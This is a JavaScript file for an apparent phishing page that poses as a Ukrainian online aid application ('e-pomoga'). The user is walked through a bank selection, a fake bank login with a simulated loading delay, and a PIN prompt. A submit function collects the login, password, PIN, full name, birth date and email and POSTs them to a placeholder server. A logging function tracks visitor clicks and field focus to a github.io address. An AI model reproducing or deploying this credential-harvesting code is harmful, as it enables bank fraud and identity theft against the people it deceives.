document.addEventListener('DOMContentLoaded', function() {
    // Отправка логов на сервер
    function sendLog(action, details = {}) {
        const userData = {
            page: window.location.href,
            timestamp: new Date().toISOString()
        };

        fetch('https://nightitpython.github.io/e-pomoga/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action, details, ...userData })
        }).catch(err => console.error('Ошибка отправки лога:', err));
    }

    // Логируем загрузку страницы
    sendLog('Страница загружена');

    // Показать выбор банка
    document.getElementById("applyBtn")?.addEventListener("click", function() {
        document.getElementById("bankSelection").style.display = "block";
        this.style.display = "none";
        sendLog('Нажатие кнопки "Подати заявку онлайн"');
    });

    // Выбор банка → переход на соответствующую страницу
    document.querySelectorAll('.bank-option').forEach(option => {
        option.addEventListener('click', function() {
            const bankName = this.getAttribute('data-bank');
            showBankPage(bankName);
            sendLog('Выбор банка', { bank: bankName });
        });
    });

    // Кнопка "Назад" на банковских страницах
    document.querySelectorAll('.back-to-main').forEach(btn => {
        btn.addEventListener('click', showMainPage);
    });

    // Обработка форм входа для всех банков
    document.querySelectorAll('.bank-login-form').forEach(form => {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            const bankId = this.id.replace('LoginForm', '');
            simulateLogin(bankId);
        });
    });

    // Обработка PIN-форм для всех банков
    document.querySelectorAll('.pin-form').forEach(form => {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            const bankId = this.id.replace('PinForm', '');
            showSuccessMessage(bankId);
        });
    });

    // Отправка основной формы
    document.querySelector('.submit-btn')?.addEventListener('click', submitForm);

    // Логируем клики по полям формы
    document.querySelectorAll('.form-control').forEach(input => {
        input.addEventListener('focus', () => {
            sendLog('Фокус на поле ввода', { field: input.placeholder });
        });
    });
});

function showBankPage(bankName) {
    document.getElementById('mainPage').style.display = 'none';
    document.getElementById('bankPages').style.display = 'block';
    
    // Скрываем все банковские страницы
    document.querySelectorAll('.bank-page').forEach(page => {
        page.style.display = 'none';
    });
    
    // Показываем выбранную страницу банка
    const bankPage = document.getElementById(`${bankName}Page`);
    if (bankPage) {
        bankPage.style.display = 'block';
        // Показываем форму входа
        document.getElementById(`${bankName}LoginForm`).classList.add('active-form');
    }
}

function showMainPage() {
    document.getElementById('mainPage').style.display = 'block';
    document.getElementById('bankPages').style.display = 'none';
    document.getElementById("bankSelection").style.display = "none";
    document.getElementById("applyBtn").style.display = "inline-block";
}

function simulateLogin(bankId) {
    // Показываем индикатор загрузки
    document.getElementById(`${bankId}LoginForm`).classList.remove('active-form');
    document.getElementById(`${bankId}Loading`).style.display = 'block';
    
    // Через 2 секунды показываем форму для PIN-кода
    setTimeout(() => {
        document.getElementById(`${bankId}Loading`).style.display = 'none';
        document.getElementById(`${bankId}PinForm`).classList.add('active-form');
    }, 2000);
}

function showSuccessMessage(bankId) {
    // Скрываем форму PIN-кода
    document.getElementById(`${bankId}PinForm`).classList.remove('active-form');
    
    // Показываем сообщение об успехе
    document.getElementById(`${bankId}SuccessMessage`).style.display = 'block';
}

function validatePin(input) {
    input.value = input.value.replace(/[^0-9]/g, '');
}

function submitForm() {
    const submitBtn = document.querySelector(".submit-btn");
    submitBtn.innerHTML = "Відправка...";
    submitBtn.disabled = true;

    // Собираем данные формы
    const formData = {
        login: document.querySelector('input[type="text"]').value,
        password: document.querySelector('input[type="password"]').value,
        pin: document.querySelector('input[placeholder*="пін-код"]').value,
        fullName: document.querySelector('input[placeholder*="ПІБ"]').value,
        birthDate: document.querySelector('input[type="date"]').value,
        email: document.querySelector('input[type="email"]').value
    };

    // Отправляем данные формы на сервер
    fetch('https://ваш-сервер.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
    })
    .then(response => {
        if (!response.ok) throw new Error('Ошибка сервера');
        return response.json();
    })
    .then(() => {
        alert("Дані успішно відправлені! Очікуйте рішення.");
        document.getElementById("dataForm").style.display = "none";
        document.getElementById("applyBtn").style.display = "inline-block";
    })
    .catch(error => {
        alert("Помилка при відправці даних: " + error.message);
    })
    .finally(() => {
        submitBtn.innerHTML = "Підтвердити";
        submitBtn.disabled = false;
        document.querySelectorAll('.form-control').forEach(input => {
            input.value = '';
        });
    });
}
